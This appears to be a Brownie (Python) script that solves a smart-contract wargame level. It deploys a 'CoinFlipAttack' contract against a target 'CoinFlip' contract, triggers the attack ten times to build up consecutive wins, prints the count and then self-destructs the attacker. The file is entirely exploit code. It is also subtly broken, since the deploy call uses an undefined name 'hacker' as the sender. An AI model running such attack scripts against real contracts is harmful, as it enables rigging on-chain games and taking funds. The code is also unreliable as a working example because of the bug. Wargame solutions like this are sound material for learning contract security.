from brownie import accounts, config, interface, web3, CoinFlip, CoinFlipAttack

def attack(target, account):
    deploy_attack = CoinFlipAttack.deploy(target, {"from": hacker})
    coinflip = CoinFlip.at(target)
    print(f'Address originating the attack:  {deploy_attack.address}')
    for i in range (0, 10):
        deploy_attack.attack({'from': account, 'gas_limit':250000, 'allow_revert': True})
    print(f'Number:  {coinflip.consecutiveWins()}')
    deploy_attack.destroy({'from': account})
    
def main(target):
    account = accounts.add(config['wallets']['from_key'])
    attack(target, account)